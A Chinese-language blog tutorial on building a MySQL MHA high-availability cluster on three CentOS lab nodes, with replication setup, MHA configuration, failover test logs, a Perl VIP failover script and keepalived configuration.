<h5 id="二-MHA工作机制"><a href="#二-MHA工作机制" class="headerlink" title="二.MHA工作机制"></a><span id="t2" style="font-weight: inherit; font-style: inherit;">二.MHA工作机制</span></h5><p>MHA自动Failover过程解析<br><a href="http://www.mysqlsystems.com/2012/03/figure-out-process-of-autofailover-on-mha.html" target="_blank" rel="external">http://www.mysqlsystems.com/2012/03/figure-out-process-of-autofailover-on-mha.html</a><br><a href="https://code.google.com/p/mysql-master-ha/wiki/Sequences_of_MHA" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Sequences_of_MHA</a></p>
<h5 id="三-MHA适用的主从架构"><a href="#三-MHA适用的主从架构" class="headerlink" title="三.MHA适用的主从架构"></a><span id="t3" style="font-weight: inherit; font-style: inherit;">三.MHA适用的主从架构</span></h5><p><a href="https://code.google.com/p/mysql-master-ha/wiki/UseCases" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/UseCases</a></p>
<h5 id="四-MHA高可用环境的构建"><a href="#四-MHA高可用环境的构建" class="headerlink" title="四.MHA高可用环境的构建"></a><span id="t4" style="font-weight: inherit; font-style: inherit;">四.MHA高可用环境的构建</span></h5><h6 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a><span id="t5" style="font-weight: inherit; font-style: inherit;">实验环境</span></h6><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/ar.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/ar.png" alt="ar"></a></p>
<ul>
<li>Node1:192.168.10.216 (主)</li>
<li>Node2:192.168.10.217 (从,主故障切换的备主)</li>
<li>Node3:192.168.10.218 (从,兼MHA管理节点)</li>
<li>VIP : 192.168.10.219</li>
<li>Mysql:Percona-Server-5.6.16-rel64.2-569</li>
<li>以上节点系统均为CentOS6.5 x64</li>
</ul>
<h6 id="实验大概步骤"><a href="#实验大概步骤" class="headerlink" title="实验大概步骤"></a><span id="t6" style="font-weight: inherit; font-style: inherit;">实验大概步骤</span></h6><ol>
<li>三节点配置epel的yum源，安装相关依赖包</li>
<li>建立主从复制关系</li>
<li>ssh-keygen实现三台机器之间相互免密钥登录</li>
<li>三节点安装mha4mysql-node-0.56,node3上安装mha4mysql-manager-0.56</li>
<li>在node3上管理MHA配置文件</li>
<li>masterha_check_ssh验证ssh信任登录是否成功,masterha_check_repl验证mysql复制是否成功</li>
<li>启动MHA manager，并监控日志文件</li>
<li>测试master(Node1)的mysql宕掉后，是否会自动切换正常<br>I . 配置VIP，切换后从自动接管主服务，并对客户端透明</li>
</ol>
<h6 id="脚本相关说明"><a href="#脚本相关说明" class="headerlink" title="脚本相关说明"></a><span id="t7" style="font-weight: inherit; font-style: inherit;">脚本相关说明</span></h6><p>MHA node有三个脚本，依赖perl模块<br>save_binary_logs：保存和拷贝宕掉的主服务器二进制日志<br>apply_diff_relay_logs:识别差异的relay log事件，并应用到所有从服务器节点<br>purge_relay_logs:清除relay log日志文件</p>
<h6 id="MHA部署过程"><a href="#MHA部署过程" class="headerlink" title="MHA部署过程"></a><span id="t8" style="font-weight: inherit; font-style: inherit;">MHA部署过程</span></h6><p><strong>A.</strong>三节点配置epel的yum源，安装相关依赖包</p>
<pre><code>rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm
rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6
yum  -y install perl-DBD-MySQL  ncftp
`&lt;/pre&gt;

**B.** 建立主从复制关系

在node1上：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt;grant replication slave  on *.* to &apos;rep&apos;@&apos;192.168.10.%&apos; identified by &apos;geekwolf&apos;;
mysql&amp;gt;grant all on *.* to &apos;root&apos;@&apos;192.168.10.%&apos; identified by &apos;geekwolf&apos;;
mysql&amp;gt;show master status;
`&lt;/pre&gt;

拷贝node1的data目录同步到node2，node3 在node2 node3上：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt;change master  to  master_host=&apos;192.168.10.216&apos;, master_user=&apos;rep&apos;, master_password=&apos;geekwolf&apos;,master_port=3306, master_log_file=&apos;mysql-in.000006&apos;,master_log_pos=120,master_connect_retry=1;
mysql&amp;gt;start slave;
`&lt;/pre&gt;

每个节点都做好mysql命令的软链

`ln -s /usr/local/mysql/bin/* /usr/local/bin/`

**C.** ssh-keygen实现三台机器之间相互免密钥登录 在node1(在其他两个节点一同)执行

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`ssh-keygen -t rsa 
ssh-copy-id -i /root/.ssh/id_rsa.pub root@node1 
ssh-copy-id -i /root/.ssh/id_rsa.pub root@node2 
ssh-copy-id -i /root/.ssh/id_rsa.pub root@node3
`&lt;/pre&gt;

**D.** 三节点安装mha4mysql-node-0.56,node3上安装mha4mysql-manager-0.56
在node1 node2 node3安装mha4mysql-node
wget [https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-node-0.56.tar.gz](https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-node-0.56.tar.gz)
tar xf mha4mysql-node-0.56.tar.gz
cd mha4mysql-node
perl Makefile.PL
make &amp;amp;&amp;amp; make install

在node3上安装mha4mysql-manager
wget [https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-manager-0.56.tar.gz](https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-manager-0.56.tar.gz)
tar xf mha4mysql-manager-0.56.tar.gz
cd mha4mysql-manager-0.56
yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Config-IniFiles perl-Time-HiRes

**E.** 在node3上管理MHA配置文件
mkdir -p /etc/mha/{app1,scripts}
cp mha4mysql-manager-0.56/samples/conf/_ /etc/mha/
cp mha4mysql-manager-0.56/samples/scripts/_ /etc/mha/scripts/
mv /etc/mha/app1.cnf /etc/mha/app1/
mv /etc/mha/masterha_default.cnf /etc/masterha_default.cnf

设置全局配置：
vim /etc/mha/masterha_default.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[server default]
user=root
password=geekwolf
ssh_user=root
repl_user=rep
repl_password=geekwolf
ping_interval=1
#shutdown_script=&quot;&quot;
secondary_check_script = masterha_secondary_check -s node1 -s node2 -s node3 --user=root --master_host=node1 --master_ip=192.168.10.216 --master_port=3306
#master_ip_failover_script=&quot;/etc/mha/scripts/master_ip_failover&quot;
#master_ip_online_change_script=&quot;/etc/mha/scripts/master_ip_online_change&quot;
# shutdown_script= /script/masterha/power_manager
#report_script=&quot;&quot;
`&lt;/pre&gt;

vim /etc/mha/app1/app1.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[server default] 
manager_workdir=/var/log/mha/app1
manager_log=/var/log/mha/app1/manager.log
[server1] 
hostname=node1
master_binlog_dir=&quot;/usr/local/mysql/logs&quot;
candidate_master=1
[server2]
hostname=node2
master_binlog_dir=&quot;/usr/local/mysql/logs&quot;
candidate_master=1
[server3]
hostname=node3
master_binlog_dir=&quot;/usr/local/mysql/logs&quot;
no_master=1
`&lt;/pre&gt;

**注释：**
candidate_master=1 表示该主机优先可被选为new master，当多个[serverX]等设置此参数时，优先级由[serverX]配置的顺序决定
secondary_check_script mha强烈建议有两个或多个网络线路检查MySQL主服务器的可用性。默认情况下,只有单一的路线 MHA Manager检查:从Manager to Master,但这是不可取的。MHA实际上可以有两个或两个以上的检查路线通过调用外部脚本定义二次检查脚本参数
master_ip_failover_script 在MySQL从服务器提升为新的主服务器时，调用此脚本，因此可以将vip信息写到此配置文件
master_ip_online_change_script 使用masterha_master_switch命令手动切换MySQL主服务器时后会调用此脚本，参数和master_ip_failover_script 类似，脚本可以互用   shutdown_script 此脚本(默认samples内的脚本)利用服务器的远程控制IDRAC等，使用ipmitool强制去关机，以避免fence设备重启主服务器，造成脑列现象
report_script 当新主服务器切换完成以后通过此脚本发送邮件报告，可参考使用 [http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz](http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz)
以上涉及到的脚本可以从mha4mysql-manager-0.56/samples/scripts/*拷贝进行修改使用
其他manager详细配置参数[https://code.google.com/p/mysql-master-ha/wiki/Parameters](https://code.google.com/p/mysql-master-ha/wiki/Parameters)

**F.** masterha_check_ssh验证ssh信任登录是否成功,masterha_check_repl验证mysql复制是否成功
验证ssh信任：masterha_check_ssh —conf=/etc/mha/app1/app1.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[root@localhost ~]# masterha_check_ssh --conf=/etc/mha/app1/app1.cnf
Tue May 13 07:53:15 2014 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.
Tue May 13 07:53:15 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..
Tue May 13 07:53:15 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..
Tue May 13 07:53:15 2014 - [info] Starting SSH connection tests..
Tue May 13 07:53:16 2014 - [debug]
Tue May 13 07:53:15 2014 - [debug] Connecting via SSH from root@node1(192.168.10.216:22) to root@node2(192.168.10.217:22)..
Tue May 13 07:53:15 2014 - [debug] ok.
Tue May 13 07:53:15 2014 - [debug] Connecting via SSH from root@node1(192.168.10.216:22) to root@node3(192.168.10.218:22)..
Tue May 13 07:53:16 2014 - [debug] ok.
Tue May 13 07:53:16 2014 - [debug]
Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node2(192.168.10.217:22) to root@node1(192.168.10.216:22)..
Tue May 13 07:53:16 2014 - [debug] ok.
Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node2(192.168.10.217:22) to root@node3(192.168.10.218:22)..
Tue May 13 07:53:16 2014 - [debug] ok.
Tue May 13 07:53:17 2014 - [debug]
Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node3(192.168.10.218:22) to root@node1(192.168.10.216:22)..
Tue May 13 07:53:16 2014 - [debug] ok.
Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node3(192.168.10.218:22) to root@node2(192.168.10.217:22)..
Tue May 13 07:53:17 2014 - [debug] ok.
Tue May 13 07:53:17 2014 - [info] All SSH connection tests passed successfully.
`&lt;/pre&gt;

验证主从复制：masterha_check_repl —conf=/etc/mha/app1/app1.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[root@localhost mha]# masterha_check_repl --conf=/etc/mha/app1/app1.cnf
Tue May 13 08:10:54 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..
Tue May 13 08:10:54 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..
Tue May 13 08:10:54 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..
Tue May 13 08:10:54 2014 - [info] MHA::MasterMonitor version 0.56.
Tue May 13 08:10:54 2014 - [info] GTID failover mode = 0
Tue May 13 08:10:54 2014 - [info] Dead Servers:
Tue May 13 08:10:54 2014 - [info] Alive Servers:
Tue May 13 08:10:54 2014 - [info] node1(192.168.10.216:3306)
Tue May 13 08:10:54 2014 - [info] node2(192.168.10.217:3306)
Tue May 13 08:10:54 2014 - [info] node3(192.168.10.218:3306)
Tue May 13 08:10:54 2014 - [info] Alive Slaves:
Tue May 13 08:10:54 2014 - [info] node2(192.168.10.217:3306) Version=5.6.16-64.2-rel64.2-log (oldest major version between slaves) log-bin:enabled
Tue May 13 08:10:54 2014 - [info] Replicating from 192.168.10.216(192.168.10.216:3306)
Tue May 13 08:10:54 2014 - [info] Primary candidate for the new Master (candidate_master is set)
Tue May 13 08:10:54 2014 - [info] node3(192.168.10.218:3306) Version=5.6.16-64.2-rel64.2-log (oldest major version between slaves) log-bin:enabled
Tue May 13 08:10:54 2014 - [info] Replicating from 192.168.10.216(192.168.10.216:3306)
Tue May 13 08:10:54 2014 - [info] Not candidate for the new Master (no_master is set)
Tue May 13 08:10:54 2014 - [info] Current Alive Master: node1(192.168.10.216:3306)
Tue May 13 08:10:54 2014 - [info] Checking slave configurations..
Tue May 13 08:10:54 2014 - [info] read_only=1 is not set on slave node2(192.168.10.217:3306).
Tue May 13 08:10:54 2014 - [warning] relay_log_purge=0 is not set on slave node2(192.168.10.217:3306).
Tue May 13 08:10:54 2014 - [info] read_only=1 is not set on slave node3(192.168.10.218:3306).
Tue May 13 08:10:54 2014 - [warning] relay_log_purge=0 is not set on slave node3(192.168.10.218:3306).
Tue May 13 08:10:54 2014 - [info] Checking replication filtering settings..
Tue May 13 08:10:54 2014 - [info] binlog_do_db= , binlog_ignore_db=
Tue May 13 08:10:54 2014 - [info] Replication filtering check ok.
Tue May 13 08:10:54 2014 - [info] GTID (with auto-pos) is not supported
Tue May 13 08:10:54 2014 - [info] Starting SSH connection tests..
Tue May 13 08:10:55 2014 - [info] All SSH connection tests passed successfully.
Tue May 13 08:10:55 2014 - [info] Checking MHA Node version..
Tue May 13 08:10:55 2014 - [info] Version check ok.
Tue May 13 08:10:55 2014 - [info] Checking SSH publickey authentication settings on the current master..
Tue May 13 08:10:56 2014 - [info] HealthCheck: SSH to node1 is reachable.
Tue May 13 08:10:56 2014 - [info] Master MHA Node version is 0.56.
Tue May 13 08:10:56 2014 - [info] Checking recovery script configurations on node1(192.168.10.216:3306)..
Tue May 13 08:10:56 2014 - [info] Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/usr/local/mysql/logs --output_file=/var/tmp/save_binary_logs_test --manager_version=0.56 --start_file=mysql-bin.000009
Tue May 13 08:10:56 2014 - [info] Connecting to root@192.168.10.216(node1:22)..
  Creating /var/tmp if not exists.. ok.
  Checking output directory is accessible or not..
   ok.
  Binlog found at /usr/local/mysql/logs, up to mysql-bin.000009
Tue May 13 08:10:56 2014 - [info] Binlog setting check done.
Tue May 13 08:10:56 2014 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..
Tue May 13 08:10:56 2014 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=node2 --slave_ip=192.168.10.217 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.16-64.2-rel64.2-log --manager_version=0.56 --relay_log_info=/usr/local/mysql/data/relay-log.info --relay_dir=/usr/local/mysql/data/ --slave_pass=xxx
Tue May 13 08:10:56 2014 - [info] Connecting to root@192.168.10.217(node2:22)..
  Checking slave recovery environment settings..
    Opening /usr/local/mysql/data/relay-log.info ... ok.
    Relay log found at /usr/local/mysql/logs, up to relay-bin.000006
    Temporary relay log file is /usr/local/mysql/logs/relay-bin.000006
    Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure.
 done.
    Testing mysqlbinlog output.. done.
    Cleaning up test file(s).. done.
Tue May 13 08:10:57 2014 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=node3 --slave_ip=192.168.10.218 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.16-64.2-rel64.2-log --manager_version=0.56 --relay_log_info=/usr/local/mysql/data/relay-log.info --relay_dir=/usr/local/mysql/data/ --slave_pass=xxx
Tue May 13 08:10:57 2014 - [info] Connecting to root@192.168.10.218(node3:22)..
  Checking slave recovery environment settings..
    Opening /usr/local/mysql/data/relay-log.info ... ok.
    Relay log found at /usr/local/mysql/logs, up to relay-bin.000006
    Temporary relay log file is /usr/local/mysql/logs/relay-bin.000006
    Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure.
 done.
    Testing mysqlbinlog output.. done.
    Cleaning up test file(s).. done.
Tue May 13 08:10:57 2014 - [info] Slaves settings check done.
Tue May 13 08:10:57 2014 - [info]
node1(192.168.10.216:3306) (current master)
 +--node2(192.168.10.217:3306)
 +--node3(192.168.10.218:3306)
Tue May 13 08:10:57 2014 - [info] Checking replication health on node2..
Tue May 13 08:10:57 2014 - [info] ok.
Tue May 13 08:10:57 2014 - [info] Checking replication health on node3..
Tue May 13 08:10:57 2014 - [info] ok.
Tue May 13 08:10:57 2014 - [warning] master_ip_failover_script is not defined.
Tue May 13 08:10:57 2014 - [warning] shutdown_script is not defined.
Tue May 13 08:10:57 2014 - [info] Got exit code 0 (Not master dead).
MySQL Replication Health is OK.
`&lt;/pre&gt;

**G.** 启动MHA manager，并监控日志文件
在node1上killall mysqld的同时在node3上启动manager服务

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[root@localhost mha]# masterha_manager --conf=/etc/mha/app1/app1.cnf
Tue May 13 08:19:01 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..
Tue May 13 08:19:01 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..
Tue May 13 08:19:01 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..
  Creating /var/tmp if not exists.. ok.
  Checking output directory is accessible or not..
   ok.
  Binlog found at /usr/local/mysql/logs, up to mysql-bin.000009
Tue May 13 08:19:18 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..
Tue May 13 08:19:18 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..
Tue May 13 08:19:18 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..
`&lt;/pre&gt;

  之后观察node3上/var/log/mha/app1/manager.log日志会发现node1 dead状态，主自动切换到node2上，而node3上的主从配置指向了node2，并且发生一次切换后会生成/var/log/mha/app1/app1.failover.complete文件；
**手动恢复node1操作：**
rm -rf /var/log/mha/app1/app1.failover.complete
启动node1上的mysql，重新配置node2 node3 主从指向node1（change master to）
**MHA Manager后台执行：**
nohup masterha_manager —conf=/etc/mha/app1/app1.cnf &amp;lt; /dev/null &amp;gt; /var/log/mha/app1/app1.log 2&amp;gt;&amp;amp;1 &amp;amp;
守护进程方式参考： [https://code.google.com/p/mysql-master-ha/wiki/Runnning_Background](https://code.google.com/p/mysql-master-ha/wiki/Runnning_Background)
[ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/weberho:/qmailtoaster/openSUSE_Tumbleweed/x86_64/daemontools-0.76-5.3.x86_64.rpm](ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/weberho:/qmailtoaster/openSUSE_Tumbleweed/x86_64/daemontools-0.76-5.3.x86_64.rpm)

###### &lt;span id=&quot;t9&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;配置VIP的方式&lt;/span&gt;

**A.**通过全局配置文件实现
vim /etc/mha/masterha_default.cnf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`[server default]
  user=root
  password=geekwolf
  ssh_user=root
  repl_user=rep
  repl_password=geekwolf
  ping_interval=1
  secondary_check_script = masterha_secondary_check -s node1 -s node2 -s node3 --user=root --master_host=node1 --master_ip=192.168.10.216 --master_port=3306
  master_ip_failover_script=&quot;/etc/mha/scripts/master_ip_failover&quot;
  master_ip_online_change_script=&quot;/etc/mha/scripts/master_ip_online_change&quot;
  #shutdown_script= /script/masterha/power_manager
  #report_script=&quot;&quot;
`&lt;/pre&gt;

修改后的master_ip_failover、master_ip_online_change脚本

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`#!/usr/bin/env perl
use strict;
use warnings FATAL =&amp;gt; &apos;all&apos;;
use Getopt::Long;
my (
    $command, $ssh_user, $orig_master_host, $orig_master_ip,
    $orig_master_port, $new_master_host, $new_master_ip, $new_master_port
);
my $vip = &apos;192.168.10.218&apos;; # Virtual IP
my $gateway = &apos;192.168.10.1&apos;;#Gateway IP
my $interface = &apos;eth0&apos;
my $key = &quot;1&quot;;
my $ssh_start_vip = &quot;/sbin/ifconfig $interface:$key $vip;/sbin/arping -I $interface -c 3 -s $vip $gateway &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&quot;;
my $ssh_stop_vip = &quot;/sbin/ifconfig $interface:$key down&quot;;
GetOptions(
    &apos;command=s&apos; =&amp;gt; \$command,
    &apos;ssh_user=s&apos; =&amp;gt; \$ssh_user,
    &apos;orig_master_host=s&apos; =&amp;gt; \$orig_master_host,
    &apos;orig_master_ip=s&apos; =&amp;gt; \$orig_master_ip,
    &apos;orig_master_port=i&apos; =&amp;gt; \$orig_master_port,
    &apos;new_master_host=s&apos; =&amp;gt; \$new_master_host,
    &apos;new_master_ip=s&apos; =&amp;gt; \$new_master_ip,
    &apos;new_master_port=i&apos; =&amp;gt; \$new_master_port,
);
exit &amp;amp;main();
sub main {
    print &quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;;
    if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) {
        # $orig_master_host, $orig_master_ip, $orig_master_port are passed.
        # If you manage master ip address at global catalog database,
        # invalidate orig_master_ip here.
        my $exit_code = 1;
        eval {
            print &quot;Disabling the VIP on old master: $orig_master_host \n&quot;;
            &amp;amp;stop_vip();
            $exit_code = 0;
        };
        if ($@) {
            warn &quot;Got Error: $@\n&quot;;
            exit $exit_code;
        }
        exit $exit_code;
    }
    elsif ( $command eq &quot;start&quot; ) {
        # all arguments are passed.
        # If you manage master ip address at global catalog database,
        # activate new_master_ip here.
        # You can also grant write access (create user, set read_only=0, etc) here.
        my $exit_code = 10;
        eval {
            print &quot;Enabling the VIP - $vip on the new master - $new_master_host \n&quot;;
            &amp;amp;start_vip();
            $exit_code = 0;
        };
        if ($@) {
            warn $@;
            exit $exit_code;
        }
        exit $exit_code;
    }
    elsif ( $command eq &quot;status&quot; ) {
        print &quot;Checking the Status of the script.. OK \n&quot;;
        `ssh $ssh_user\@cluster1 \&quot; $ssh_start_vip \&quot;`;
        exit 0;
    }
    else {
        &amp;amp;usage();
        exit 1;
    }
}
# A simple system call that enable the VIP on the new master
sub start_vip() {
    `ssh $ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`;
}
# A simple system call that disable the VIP on the old_master
sub stop_vip() {
    `ssh $ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`;
}
sub usage {
    print
    &quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;;
}
`&lt;/pre&gt;

**B.**通过第三方HA（keepalived、heartbeat）实现VIP，以keepalived为例
以node1 node2互为主备进行配置keepalived
在node1 node2上分别下载安装keepalived
wget [http://www.keepalived.org/software/keepalived-1.2.13.tar.gz](http://www.keepalived.org/software/keepalived-1.2.13.tar.gz)
yum -y install popt-*
./configure —prefix=/usr/local/keepalived —enable-snmp
make &amp;amp;&amp;amp; make install
cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/rc.d/init.d/
cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/
chmod +x /etc/rc.d/init.d/keepalived
chkconfig keepalived on
mkdir /etc/keepalived
ln -s /usr/local/keepalived/sbin/keepalived /usr/sbin

修改node1(192.168.10.216)配置文件
vim /etc/keepalived/keepalived.conf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`! Configuration File for keepalived
global_defs {
 router_id MHA 
 notification_email {
 root@localhost   #接收邮件，可以有多个，一行一个
}
 #当主、备份设备发生改变时，通过邮件通知
 notification_email_from  m@localhost
 #发送邮箱服务器
 smtp_server 127.0.0.1
 #发送邮箱超时时间
 smtp_connect_timeout 30
 }

varrp_script check_mysql {
     script &quot;/etc/keepalived/check_mysql.sh&quot;
}
vrrp_sync_group VG1 {
    group {
          VI_1
    }
notify_master &quot;/etc/keepalived/master.sh&quot;
}

vrrp_instance VI_1 {
     state master     
     interface eth0   
     virtual_router_id 110
     priority 100            
     advert_int 1
     nopreempt #不抢占资源，意思就是它活了之后也不会再把主抢回来

     authentication {
     # 认证方式，可以是PASS或AH两种认证方式
     auth_type PASS
     # 认证密码
     auth_pass geekwolf
     }
track_script {
     check_mysql
}
virtual_ipaddress {
     192.168.10.219
     }

}
`&lt;/pre&gt;

修改node2(192.168.10.217)配置文件
vim /etc/keepalived/keepalived.conf

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`! Configuration File for keepalived
global_defs {
 router_id MHA 
 notification_email {
 root@localhost   #接收邮件，可以有多个，一行一个
}
 #当主、备份设备发生改变时，通过邮件通知
 notification_email_from  m@localhost
 #发送邮箱服务器
 smtp_server 127.0.0.1
 #发送邮箱超时时间
 smtp_connect_timeout 30
 }

varrp_script check_mysql {
     script &quot;/etc/keepalived/check_mysql.sh&quot;
}
vrrp_sync_group VG1 {
    group {
          VI_1
    }
notify_master &quot;/etc/keepalived/master.sh&quot;
}
vrrp_instance VI_1 {
     state backup    
     interface eth0    
     virtual_router_id 110
     priority 99            
     advert_int 1

     authentication {
     # 认证方式，可以是PASS或AH两种认证方式
     auth_type PASS
     # 认证密码
     auth_pass geekwolf
     }
track_script {
     check_mysql
}
virtual_ipaddress {
     192.168.10.219
     }

}
`&lt;/pre&gt;

check_mysql.sh

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`#!/bin/bash
MYSQL=/usr/local/mysql/bin/mysql
MYSQL_HOST=127.0.0.1
MYSQL_USER=root
MYSQL_PASSWORD=geekwolf
CHECK_TIME=3
#mysql  is working MYSQL_OK is 1 , mysql down MYSQL_OK is 0
MYSQL_OK=1
function check_mysql_helth (){
$MYSQL -h $MYSQL_HOST -u $MYSQL_USER -e &quot;show status;&quot; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
if [ $? = 0 ] ;then
     MYSQL_OK=1
else
     MYSQL_OK=0
fi
     return $MYSQL_OK
}
while [ $CHECK_TIME -ne 0 ]
do
     let &quot;CHECK_TIME -= 1&quot;
     check_mysql_helth
if [ $MYSQL_OK = 1 ] ; then
     CHECK_TIME=0
     exit 0
fi
if [ $MYSQL_OK -eq 0 ] &amp;amp;&amp;amp;  [ $CHECK_TIME -eq 0 ]
then
     pkill keepalived
exit 1
fi
sleep 1
done
`&lt;/pre&gt;

master.sh

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`#!/bin/bash
VIP=192.168.10.219
GATEWAY=1.1
/sbin/arping -I eth0 -c 5 -s $VIP $GATEWAY &amp;amp;&amp;gt;/dev/null
</code></pre><p>chmod +x /etc/keepalived/check_mysql.sh<br>chmod +x /etc/keepalived/master.sh</p>
<h5 id="五-MHA常用命令"><a href="#五-MHA常用命令" class="headerlink" title="五.MHA常用命令"></a><span id="t10" style="font-weight: inherit; font-style: inherit;">五.MHA常用命令</span></h5><p>查看manager状态<br>masterha_check_status —conf=/etc/mha/app1/app1.cnf</p>
<p>查看免密钥是否正常<br>masterha_check_ssh —conf=/etc/mha/app1/app1.cnf</p>
<p>查看主从复制是否正常<br>masterha_check_repl —conf=/etc/mha/app1/app1.cnf</p>
<p>添加新节点server4到配置文件<br>masterha_conf_host —command=add —conf=/etc/mha/app1/app1.cnf —hostname=geekwolf —block=server4 —params=“no_master=1;ignore_fail=1” 删除server4节点<br>masterha_conf_host —command=delete —conf=/etc/mha/app1/app1.cnf —block=server4</p>
<p><strong>注：</strong><br>block:为节点区名，默认值 为[server_$hostname],如果设置成block=100，则为[server100] params:参数，分号隔开(参考<a href="https://code.google.com/p/mysql-master-ha/wiki/Parameters" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Parameters</a>)</p>
<p>关闭manager服务<br>masterha_stop —conf=/etc/mha/app1/app1.cnf</p>
<p>主手动切换(前提不要启动masterha_manager服务)<br>在主node1存活情况下进行切换<br>交互模式：<br>masterha_master_switch —master_state=alive —conf=/etc/mha/app1/app1.cnf —new_master_host=node2<br>非交互模式：<br>masterha_master_switch —master_state=alive —conf=/etc/mha/app1/app1.cnf —new_master_host=node2 —interactive=0<br>在主node1宕掉情况下进行切换<br>masterha_master_switch —master_state=dead —conf=/etc/mha/app1/app1.cnf —dead_master_host=node1 —dead_master_ip=192.168.10.216 —dead_master_port=3306 —new_master_host=192.168.10.217 详细请参考:<a href="https://code.google.com/p/mysql-master-ha/wiki/TableOfContents?tm=6" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/TableOfContents?tm=6</a> *</p>
<h5 id="六-注意事项"><a href="#六-注意事项" class="headerlink" title="六.注意事项"></a><span id="t11" style="font-weight: inherit; font-style: inherit;">六.注意事项</span></h5><p><strong>A.</strong> 以上两种vip切换方式，建议采用第一种方法<br><strong>B.</strong> 发生主备切换后，manager服务会自动停掉，且在/var/log/mha/app1下面生成<br>app1.failover.complete，若再次发生切换需要删除app1.failover.complete文件<br><strong>C.</strong> 测试过程发现一主两从的架构(两从都设置可以担任主角色candidate_master=1)，当旧主故障迁移到备主后，删除app1.failover.complete，再次启动manager，停掉新主后，发现无法正常切换(解决方式：删除/etc/mha/app1/app1.cnf里面的旧主node1的信息后，重新切换正常)<br><strong>D.</strong> arp缓存导致切换VIP后，无法使用问题<br><strong>E.</strong> 使用Semi-Sync能够最大程度保证数据安全<br><strong>F.</strong> Purge_relay_logs脚本删除中继日志不会阻塞SQL线程，在每台从节点上设置计划任务定期清除中继日志<br>0 5 <em> </em> * root /usr/bin/purge_relay_logs —user=root —password=geekwolf —disable_relay_log_purge &gt;&gt; /var/log/mha/purge_relay_logs.log 2&gt;&amp;1</p>
